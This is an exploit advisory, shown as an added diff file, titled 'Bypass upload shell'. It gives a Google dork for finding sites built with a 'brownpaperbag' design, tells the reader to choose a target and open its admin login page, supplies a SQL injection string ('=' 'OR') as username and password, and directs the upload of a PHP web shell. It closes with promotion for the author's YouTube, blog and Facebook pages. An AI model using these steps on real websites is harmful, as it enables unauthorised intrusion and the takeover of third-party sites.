@@ -1,0 +1,29 @@
+##################################################JokerSecurity############################################################### 
+#
+# Exploit Title : Bypass upload shell
+# Google Dork : intext:"site design brownpaperbag"
+# Tested On : [ BackBox ]
+# MyChannel Youtube : https://www.youtube.com/channel/UCPRRAzu8dMWxChn-RruC-eg/videos 
+# Myblog : http://kader-information.blogspot.com/ 
+# Link video : https://www.youtube.com/watch?v=rSVFbYXJoZQ&feature=youtu.be
+###################### 
+# [+] DESCRIPTION : 
+###################### 
+#
+# 1:Search Google Dork and Choose a Target 
+# 2: admin-panel site.com/[PATH]/admin/login.php or site.com/admin/index.php
+# 3: and put this username & password :
+#  username : '=' 'OR'
+#  password : '=' 'OR'
+# 4: Upload Your shell ====== shell.php
+
+
+subscribe for my channel and page in facebook 
+
+# My Blogger : http://kader-information.blogspot.com/ 
+
+# Page FacebOOk : https://www.facebook.com/AnonymousPalestine.vip 
+
+By <3
+
+##################################################JokerSecurity##########################################################
